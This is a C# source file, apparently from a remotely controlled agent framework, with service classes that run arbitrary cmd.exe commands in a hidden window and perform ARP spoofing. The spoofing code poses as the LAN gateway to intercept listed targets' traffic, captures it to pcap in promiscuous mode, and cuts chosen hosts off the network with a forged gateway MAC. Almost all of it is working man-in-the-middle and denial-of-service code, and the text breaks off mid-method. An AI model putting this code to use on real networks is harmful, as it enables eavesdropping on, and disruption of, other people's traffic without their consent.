using System;
using System.ComponentModel;
using System.IO;
using System.Text;
using ServiceSDK;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using System.Collections.Generic;
using Lidgren.Network;
using System.Net;
using CommonTool;
using System.Threading;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Base;
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;
using System.Linq;

namespace SPA
{
    public class Cmd : ServiceBase
    {
        string cmd_file;
        string cmd_params;
        string outputMsg;
        string errorMsg;

        public Cmd() { }

        protected override void preExecute()
        {
            if (Params.Length > 0)
            {
                cmd_file = Path.Combine(ServicePath, Params[0]);
                cmd_params = "";
                for (int i = 1; i < Params.Length; i++)
                    cmd_params += Params[i] + " ";
            }
        }

        protected override void onExecute()
        {
            if (Directory.GetFiles(ServicePath, Path.GetFileName(cmd_file) + "*", SearchOption.TopDirectoryOnly).Count() > 0)
                ExecuteShellCommand(cmd_file, cmd_params, ref outputMsg, ref errorMsg);
            else
                errorMsg = "Not Found file path.";
        }

        protected override void postExecute()
        {
            if (!string.IsNullOrEmpty(outputMsg))
            {
                // Write log content.
                using (FileStream stream = new FileStream(this.Log_Name, FileMode.OpenOrCreate, FileAccess.Write))
                {
                    StreamWriter sw = new StreamWriter(stream);
                    sw.Write(outputMsg);
                    sw.Flush();
                    sw.Close();
                }
                Result = outputMsg;
            }
            else
                Result = errorMsg;
        }

        /// <summary>
        /// Execute a shell command
        /// </summary>
        /// <param name="_FileToExecute">File/Command to execute</param>
        /// <param name="_CommandLine">Command line parameters to pass</param> 
        /// <param name="_outputMessage">returned string value after executing shell command</param> 
        /// <param name="_errorMessage">Error messages generated during shell execution</param> 
        private void ExecuteShellCommand(string _FileToExecute, string _CommandLine, ref string _outputMessage, ref string _errorMessage)
        {
            // Set process variable
            // Provides access to local and remote processes and enables you to start and stop local system processes.
            System.Diagnostics.Process _Process = null;
            try
            {
                _Process = new System.Diagnostics.Process();

                // invokes the cmd process specifying the command to be executed.
                string _CMDProcess = string.Format(System.Globalization.CultureInfo.InvariantCulture, @"{0}\cmd.exe", new object[] { Environment.SystemDirectory });

                // pass executing file to cmd (Windows command interpreter) as a arguments
                // /C tells cmd that we want it to execute the command that follows, and then exit.
                string _Arguments = string.Format(System.Globalization.CultureInfo.InvariantCulture, "/C \"{0}\"", new object[] { Path.GetFileName(_FileToExecute) });

                // pass any command line parameters for execution
                if (_CommandLine != null && _CommandLine.Length > 0)
                {
                    _Arguments += string.Format(System.Globalization.CultureInfo.InvariantCulture, " {0}", new object[] { _CommandLine, System.Globalization.CultureInfo.InvariantCulture });
                }

                // Specifies a set of values used when starting a process.
                System.Diagnostics.ProcessStartInfo _ProcessStartInfo = new System.Diagnostics.ProcessStartInfo(_CMDProcess, _Arguments);
                // sets a value indicating not to start the process in a new window. 
                _ProcessStartInfo.CreateNoWindow = true;
                // sets a value indicating not to use the operating system shell to start the process. 
                _ProcessStartInfo.UseShellExecute = false;
                // sets a value that indicates the output/input/error of an application is written to the Process.
                _ProcessStartInfo.RedirectStandardOutput = true;
                _ProcessStartInfo.RedirectStandardInput = true;
                _ProcessStartInfo.RedirectStandardError = true;
                _ProcessStartInfo.WorkingDirectory = Directory.GetParent(_FileToExecute).FullName;
                _Process.StartInfo = _ProcessStartInfo;

                StringBuilder sbOut = new StringBuilder();
                StringBuilder sbError = new StringBuilder();

                _Process.OutputDataReceived += delegate(object sender, System.Diagnostics.DataReceivedEventArgs e)
                {
                    sbOut.AppendLine(e.Data);
                };

                _Process.ErrorDataReceived += delegate(object sender, System.Diagnostics.DataReceivedEventArgs e)
                {
                    sbError.AppendLine(e.Data);
                };

                _Process.Start();

                _Process.BeginOutputReadLine();
                _Process.BeginErrorReadLine();

                _Process.WaitForExit();
                _outputMessage = sbOut.ToString();
                _errorMessage = sbError.ToString();

                //// Starts a process resource and associates it with a Process component.
                //_Process.Start();

                //// Instructs the Process component to wait indefinitely for the associated process to exit.
                //_errorMessage = _Process.StandardError.ReadToEnd();
                //_Process.WaitForExit();

                //// Instructs the Process component to wait indefinitely for the associated process to exit.
                //_outputMessage = _Process.StandardOutput.ReadToEnd();
                //_Process.WaitForExit();
            }
            catch (Win32Exception _Win32Exception)
            {
                // Error
                Console.WriteLine("Win32 Exception caught in process: {0}", _Win32Exception.ToString());
            }
            catch (Exception _Exception)
            {
                // Error
                Console.WriteLine("Exception caught in process: {0}", _Exception.ToString());
            }
            finally
            {
                // close process and do cleanup
                _Process.Close();
                _Process.Dispose();
                _Process = null;
            }
        }

    }

    public class VirtualGateway  : ServiceBase
    {
        [DllImport("Ws2_32.dll", EntryPoint = "inet_addr", CharSet = CharSet.Ansi)]
        private static extern Int32 inet_addr(string ipaddr);

        [DllImport("Iphlpapi.dll", EntryPoint = "SendARP", CharSet = CharSet.Ansi)]
        private static extern int SendARP(Int32 DestIP, Int32 SrcIP, ref Int64 MacAddr, ref Int32 PhyAddrLen);

        private Sniffing sniff;
        private PacketDevice selectedDevice;
        private int ExecutionPeriod;
        private BackgroundWorker t_FilterAllPackets;
        private BackgroundWorker t_ARPSpoofing;
        private PacketCommunicator communicator;
        private IPAddress IP; // Localhost public IP address
        private string mac; // Localhost Mac Address
        private string gatewayIPAddress;
        private string gatewayMacAddress;

        private Dictionary<string, string> spoofingList; // IP : Mac

        public VirtualGateway() 
        {
            // Selected active NIC
            IPAddress mask;
            IP = NetUtility.GetMyAddress(out mask);
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
            foreach (var device in allDevices)
            {
                foreach (DeviceAddress address in device.Addresses)
                    if (address.Address.ToString() == string.Format("Internet {0}", IP.ToString()))
                        selectedDevice = device;
            }

            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                foreach (UnicastIPAddressInformation ip in nic.GetIPProperties().UnicastAddresses)
                {
                    if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork && ip.Address.Equals(IP))
                    {
                        gatewayIPAddress = nic.GetIPProperties().GatewayAddresses.FirstOrDefault().Address.ToString();
                        gatewayMacAddress = GetMacAddress(gatewayIPAddress);
                        mac = GetMacAddress(IP.ToString());
                    }
                }
            }

            t_FilterAllPackets = new BackgroundWorker();
            t_FilterAllPackets.DoWork += new DoWorkEventHandler(t_FilterARPPackets_DoWork);

            t_ARPSpoofing = new BackgroundWorker();
            t_ARPSpoofing.WorkerSupportsCancellation = true;
            t_ARPSpoofing.DoWork += new DoWorkEventHandler(t_ARPSpoofing_DoWork);

            // TODO: Add spooffing target into dictionary
            spoofingList = new Dictionary<string, string>();
            //spoofingList["140.126.130.72"] = GetMacAddress("140.126.130.72");
        }

        private string GetMacAddress(string ip)
        {
            StringBuilder macAddress = new StringBuilder();

            try
            {
                Int32 remote = inet_addr(ip);
                Int64 macInfo = new Int64();
                Int32 length = 6;
                SendARP(remote, 0, ref macInfo, ref length);

                string tmp = Convert.ToString(macInfo, 16).PadLeft(12, '0').ToUpper();

                for (int i = 0, x = 12; i < 6; i++, x -= 2)
                {
                    if (i == 5)
                        macAddress.Append(tmp.Substring(x - 2, 2));
                    else
                        macAddress.Append(tmp.Substring(x - 2, 2) + ":");
                }
            }
            catch { }

            return macAddress.ToString();
        }

        private void t_ARPSpoofing_DoWork(object sender, DoWorkEventArgs e)
        {
            while (!t_ARPSpoofing.CancellationPending)
            {
                #region Not using...
                //// Spoofing target
                //EthernetLayer ethernetLayer = new EthernetLayer
                //{
                //    Source = new MacAddress("44:87:fc:92:a8:ff"), // Localhost mac address
                //    Destination = new MacAddress("44:87:fc:92:a8:fe"), // Spoofing target mac address
                //    EtherType = EthernetType.None
                //};

                //ArpLayer arpLayer = new ArpLayer
                //{
                //    ProtocolType = EthernetType.IpV4,
                //    Operation = ArpOperation.Reply,
                //    SenderHardwareAddress = new byte[] { 0x44, 0x87, 0xFC, 0x92, 0xA8, 0xFF }.AsReadOnly(), // localhost mac address
                //    SenderProtocolAddress = new byte[] { 140, 126, 130, 254 }.AsReadOnly(), // The Gateway IP of the lan
                //    TargetHardwareAddress = new byte[] { 0x44, 0x87, 0xFC, 0x92, 0xA8, 0xFE }.AsReadOnly(), // Spoofing target mac address
                //    TargetProtocolAddress = new byte[] { 140, 126, 130, 74 }.AsReadOnly() // Spoofing target IP
                //};

                //PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);

                //_communicator.SendPacket(builder.Build(DateTime.Now));

                //// Fixed localhost arp table
                //ethernetLayer = new EthernetLayer
                //{
                //    Source = new MacAddress("44:87:fc:92:a8:ff"), // Localhost mac address
                //    Destination = new MacAddress("44:87:fc:92:a8:fe"), // Spoofing target mac address
                //    EtherType = EthernetType.None
                //};

                //arpLayer = new ArpLayer
                //{
                //    ProtocolType = EthernetType.IpV4,
                //    Operation = ArpOperation.Reply,
                //    SenderHardwareAddress = new byte[] { 0x44, 0x87, 0xFC, 0x92, 0xA8, 0xFF }.AsReadOnly(), // localhost mac address
                //    SenderProtocolAddress = new byte[] { 140, 126, 130, 254 }.AsReadOnly(), // The Gateway IP of the lan
                //    TargetHardwareAddress = new byte[] { 0x44, 0x87, 0xFC, 0x92, 0xA8, 0xFE }.AsReadOnly(), // Spoofing target mac address
                //    TargetProtocolAddress = new byte[] { 140, 126, 130, 74 }.AsReadOnly() // Spoofing target IP
                //};

                //builder = new PacketBuilder(ethernetLayer, arpLayer);

                //_communicator.SendPacket(builder.Build(DateTime.Now));
                #endregion
                foreach (var kvp in spoofingList)
                    SpoofingTarget(kvp.Value, kvp.Key);
                RecoveringMyself();

                Thread.Sleep(5000);
            }
        }

        private void t_FilterARPPackets_DoWork(object sender, DoWorkEventArgs e)
        {
            communicator.ReceivePackets(0, PacketHandler);
        }

        private void PacketHandler(Packet packet)
        {
            if (packet.Ethernet.EtherType == EthernetType.Arp && spoofingList.Values.Contains(packet.Ethernet.Source.ToString()))
            {
                Console.WriteLine(packet.Ethernet.EtherType + " : " + packet.Ethernet.Source.ToString() + " : " + packet.IpV4.Source.ToString());
                SpoofingTarget(packet.Ethernet.Source.ToString(), packet.IpV4.Source.ToString());
                RecoveringMyself();
            }
        }

        private void RecoveringMyself()
        {
            using (PacketCommunicator communicator = selectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000))
            {
                EthernetLayer ethernetLayer = new EthernetLayer
                {
                    Source = new MacAddress(mac),
                    Destination = new MacAddress(mac),
                    EtherType = EthernetType.None
                };

                ArpLayer arpLayer = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Reply,
                    SenderHardwareAddress = new byte[]
                        {
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[0], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[1], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[2], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[3], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[4], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[5], System.Globalization.NumberStyles.HexNumber))
                        }.AsReadOnly(),
                    SenderProtocolAddress = new byte[]
                        {
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[0])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[1])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[2])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[3]))
                        }.AsReadOnly(),
                    TargetHardwareAddress = new byte[]
                        {
                            Convert.ToByte(Int32.Parse(mac.Split(':')[0], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[1], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[2], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[3], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[4], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[5], System.Globalization.NumberStyles.HexNumber))
                        }.AsReadOnly(),
                    TargetProtocolAddress = new byte[]
                        {
                            Convert.ToByte(Convert.ToInt32(IP.ToString().Split('.')[0])),
                            Convert.ToByte(Convert.ToInt32(IP.ToString().Split('.')[1])),
                            Convert.ToByte(Convert.ToInt32(IP.ToString().Split('.')[2])),
                            Convert.ToByte(Convert.ToInt32(IP.ToString().Split('.')[3])),
                        }.AsReadOnly()
                };

                PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);
                communicator.SendPacket(builder.Build(DateTime.Now));
            }
        }

        private void RecoverTarget(string spoofingTargetMac, string spoofingTargetIP)
        {
            using (PacketCommunicator communicator = selectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000))
            {
                EthernetLayer ethernetLayer = new EthernetLayer
                {
                    Source = new MacAddress(mac),
                    Destination = new MacAddress(spoofingTargetMac),
                    EtherType = EthernetType.None
                };

                ArpLayer arpLayer = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Reply,
                    SenderHardwareAddress = new byte[]
                        {
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[0], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[1], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[2], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[3], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[4], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[5], System.Globalization.NumberStyles.HexNumber))
                        }.AsReadOnly(),
                    SenderProtocolAddress = new byte[]
                        {
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[0])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[1])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[2])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[3]))
                        }.AsReadOnly(),
                    TargetHardwareAddress = new byte[]
                        {
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[0], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[1], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[2], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[3], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[4], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[5], System.Globalization.NumberStyles.HexNumber))
                        }.AsReadOnly(),
                    TargetProtocolAddress = new byte[]
                        {
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[0])),
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[1])),
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[2])),
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[3])),
                        }.AsReadOnly()
                };

                PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);
                communicator.SendPacket(builder.Build(DateTime.Now));
            }
        }

        private void SpoofingTarget(string spoofingTargetMac, string spoofingTargetIP)
        {
            using (PacketCommunicator communicator = selectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000))
            {
                EthernetLayer ethernetLayer = new EthernetLayer
                {
                    Source = new MacAddress(mac),
                    Destination = new MacAddress(spoofingTargetMac),
                    EtherType = EthernetType.None
                };

                ArpLayer arpLayer = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Reply,
                    SenderHardwareAddress = new byte[]
                        {
                            Convert.ToByte(Int32.Parse(mac.Split(':')[0], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[1], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[2], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[3], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[4], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[5], System.Globalization.NumberStyles.HexNumber))
                        }.AsReadOnly(),
                    SenderProtocolAddress = new byte[]
                        {
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[0])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[1])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[2])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[3]))
                        }.AsReadOnly(),
                    TargetHardwareAddress = new byte[]
                        {
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[0], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[1], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[2], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[3], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[4], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[5], System.Globalization.NumberStyles.HexNumber))
                        }.AsReadOnly(),
                    TargetProtocolAddress = new byte[]
                        {
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[0])),
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[1])),
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[2])),
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[3])),
                        }.AsReadOnly()
                };

                PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);
                communicator.SendPacket(builder.Build(DateTime.Now));
            }
        }

        protected override void preExecute()
        {
            // Handling parameters
            // Process time
            ExecutionPeriod = Convert.ToInt32(Params[0]) * 1000;
            // Spoofed target
            foreach (string ip in Params[1].Split(','))
            {
                spoofingList[ip] = GetMacAddress(ip);
            }

            spoofingList.Remove("");
            spoofingList.Remove(CD2Constant.BootstrapHost);

            sniff = new Sniffing();

            communicator = selectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1000);
            t_ARPSpoofing.RunWorkerAsync();
        }

        protected override void onExecute()
        {
            t_FilterAllPackets.RunWorkerAsync();
            sniff.Start(this.Log_Name);
            Thread.Sleep(ExecutionPeriod);
        }

        protected override void postExecute()
        { 
            communicator.Break();

            if (t_FilterAllPackets != null)
                t_FilterAllPackets.Dispose();

            if (t_ARPSpoofing != null)
            {
                t_ARPSpoofing.CancelAsync();
                t_ARPSpoofing.Dispose();
            }

            sniff.Stop();
            foreach (var kvp in spoofingList)
                RecoverTarget(kvp.Value, kvp.Key);

            Thread.Sleep(1000);
        }

        public override void Start(string log_name)
        {
            base.Start(log_name);

            onExecute();
        }

        public void Stop()
        {
            postExecute();
        }
    }

    public class Sniffing : ServiceBase
    {
        public class PacketArgs : EventArgs
        {
            public Packet packet { get; set; }
            public PacketArgs(Packet p)
            {
                packet = p;
            }
        }

        [DllImport("Ws2_32.dll", EntryPoint = "inet_addr", CharSet = CharSet.Ansi)]
        private static extern Int32 inet_addr(string ipaddr);

        [DllImport("Iphlpapi.dll", EntryPoint = "SendARP", CharSet = CharSet.Ansi)]
        private static extern int SendARP(Int32 DestIP, Int32 SrcIP, ref Int64 MacAddr, ref Int32 PhyAddrLen);
        private PacketDevice selectedDevice;
        private int ExecutionPeriod;
        private BackgroundWorker t_SnifferWorker;
        private PacketCommunicator communicator;

        public Sniffing() 
        {
            // Selected active NIC
            IPAddress IP, mask;
            IP = NetUtility.GetMyAddress(out mask);
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
            foreach (var device in allDevices)
            {
                foreach (DeviceAddress address in device.Addresses)
                    if (address.Address.ToString() == string.Format("Internet {0}", IP.ToString()))
                        selectedDevice = device;
            }

            t_SnifferWorker = new BackgroundWorker();
            t_SnifferWorker.DoWork += new DoWorkEventHandler(OpenDevice);
            communicator = selectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1000);
            communicator.SetFilter("not ether src " + GetMacAddress(IP.ToString()));
        }

        protected override void preExecute()
        {
            // Handling parameters
            ExecutionPeriod = Convert.ToInt32(Params[0]) * 1000;
        }

        protected override void onExecute()
        {
            t_SnifferWorker.RunWorkerAsync();
            Thread.Sleep(ExecutionPeriod);
        }

        protected override void postExecute()
        {
            communicator.Break();

            if (t_SnifferWorker != null)
                t_SnifferWorker.Dispose();
        }

        public override void Start(string log_name)
        {
            base.Start(log_name);

            onExecute();
        }

        public void Stop()
        {
            postExecute();
        }

        private void OpenDevice(object sender, DoWorkEventArgs e)
        {
            // Fucking idiot = tomato, Log name problem.....
            using (PacketDumpFile dumpFile = communicator.OpenDump(this.Log_Name))
            {
                communicator.ReceivePackets(0, dumpFile.Dump);
            }
        }

        private string GetMacAddress(string ip)
        {
            StringBuilder macAddress = new StringBuilder();

            try
            {
                Int32 remote = inet_addr(ip);
                Int64 macInfo = new Int64();
                Int32 length = 6;
                SendARP(remote, 0, ref macInfo, ref length);

                string tmp = Convert.ToString(macInfo, 16).PadLeft(12, '0').ToUpper();

                for (int i = 0, x = 12; i < 6; i++, x -= 2)
                {
                    if (i == 5)
                        macAddress.Append(tmp.Substring(x - 2, 2));
                    else
                        macAddress.Append(tmp.Substring(x - 2, 2) + ":");
                }
            }
            catch { }

            return macAddress.ToString();
        }
    }

    public class Filtering : ServiceBase
    {
        [DllImport("Ws2_32.dll", EntryPoint = "inet_addr", CharSet = CharSet.Ansi)]
        private static extern Int32 inet_addr(string ipaddr);

        [DllImport("Iphlpapi.dll", EntryPoint = "SendARP", CharSet = CharSet.Ansi)]
        private static extern int SendARP(Int32 DestIP, Int32 SrcIP, ref Int64 MacAddr, ref Int32 PhyAddrLen);

        private int ExecutionPeriod;
        private Dictionary<string, string> BlockedList;
        private PacketDevice selectedDevice;
        private BackgroundWorker t_filterWorker;
        //private VirtualGateway virtualGateway;

        private IPAddress IP;
        private string mac; // Localhost Mac Address
        private string gatewayIPAddress;
        private string gatewayMacAddress;

        public Filtering() 
        {
            BlockedList = new Dictionary<string,string>();

            // Selected active NIC
            IPAddress mask;
            IP = NetUtility.GetMyAddress(out mask);
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
            foreach (var device in allDevices)
            {
                foreach (DeviceAddress address in device.Addresses)
                    if (address.Address.ToString() == string.Format("Internet {0}", IP.ToString()))
                        selectedDevice = device;
            }

            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                foreach (UnicastIPAddressInformation ip in nic.GetIPProperties().UnicastAddresses)
                {
                    if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork && ip.Address.Equals(IP))
                    {
                        gatewayIPAddress = nic.GetIPProperties().GatewayAddresses.FirstOrDefault().Address.ToString();
                        gatewayMacAddress = GetMacAddress(gatewayIPAddress);
                        mac = GetMacAddress(IP.ToString());
                    }
                }
            }

            t_filterWorker = new BackgroundWorker();
            t_filterWorker.WorkerSupportsCancellation = true;
            t_filterWorker.DoWork += new DoWorkEventHandler(t_filterWorker_DoWork);
        }

        void t_filterWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            while (!t_filterWorker.CancellationPending)
            {
                foreach (var kvp in BlockedList)
                {
                    SpoofingTarget(kvp.Value, kvp.Key);
                    RecoveringMyself();
                }
                Thread.Sleep(1000);
            }
        }

        protected override void preExecute()
        {
            ExecutionPeriod = Convert.ToInt32(Params[0]) * 1000;
            //if (Convert.ToBoolean(Convert.ToInt32(Params[2])))
            //    virtualGateway = new VirtualGateway();

            foreach (string ip in Params[1].Split(','))
            {
                string tmpMACAddress = GetMacAddress(ip);
                if (!tmpMACAddress.Equals(gatewayMacAddress))
                    BlockedList[ip] = tmpMACAddress;
            }
        }

        protected override void onExecute()
        {
            //if (virtualGateway != null)
            //    virtualGateway.Start(this.Log_Name);
            t_filterWorker.RunWorkerAsync();
            Thread.Sleep(ExecutionPeriod);
        }

        protected override void postExecute()
        {
            if (t_filterWorker != null)
            {
                t_filterWorker.CancelAsync();
                t_filterWorker.Dispose();
            }

            //if (virtualGateway != null)
            //    virtualGateway.Stop();

            // Recovery
            foreach (var kvp in BlockedList)
                RecoverTarget(kvp.Value, kvp.Key);

            Thread.Sleep(1000);
        }

        private string GetMacAddress(string ip)
        {
            StringBuilder macAddress = new StringBuilder();

            try
            {
                Int32 remote = inet_addr(ip);
                Int64 macInfo = new Int64();
                Int32 length = 6;
                SendARP(remote, 0, ref macInfo, ref length);

                string tmp = Convert.ToString(macInfo, 16).PadLeft(12, '0').ToUpper();

                for (int i = 0, x = 12; i < 6; i++, x -= 2)
                {
                    if (i == 5)
                        macAddress.Append(tmp.Substring(x - 2, 2));
                    else
                        macAddress.Append(tmp.Substring(x - 2, 2) + ":");
                }
            }
            catch { }

            return macAddress.ToString();
        }

        private void SpoofingTarget(string spoofingTargetMac, string spoofingTargetIP)
        {
            using (PacketCommunicator communicator = selectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000))
            {
                EthernetLayer ethernetLayer = new EthernetLayer
                {
                    Source = new MacAddress(mac),
                    Destination = new MacAddress(spoofingTargetMac),
                    EtherType = EthernetType.None
                };

                ArpLayer arpLayer = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Reply,
                    SenderHardwareAddress = new byte[]
                        {
                            Convert.ToByte(Int32.Parse("AB", System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse("CD", System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse("EF", System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse("12", System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse("34", System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse("56", System.Globalization.NumberStyles.HexNumber))
                        }.AsReadOnly(),
                    SenderProtocolAddress = new byte[]
                        {
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[0])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[1])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[2])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[3]))
                        }.AsReadOnly(),
                    TargetHardwareAddress = new byte[]
                        {
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[0], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[1], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[2], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[3], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[4], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[5], System.Globalization.NumberStyles.HexNumber))
                        }.AsReadOnly(),
                    TargetProtocolAddress = new byte[]
                        {
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[0])),
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[1])),
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[2])),
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[3])),
                        }.AsReadOnly()
                };

                PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);
                communicator.SendPacket(builder.Build(DateTime.Now));
            }
        }

        private void RecoveringMyself()
        {
            using (PacketCommunicator communicator = selectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000))
            {
                EthernetLayer ethernetLayer = new EthernetLayer
                {
                    Source = new MacAddress(mac),
                    Destination = new MacAddress(mac),
                    EtherType = EthernetType.None
                };

                ArpLayer arpLayer = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Reply,
                    SenderHardwareAddress = new byte[]
                        {
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[0], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[1], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[2], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[3], System.Globalization.NumberStyles.HexNumber)),
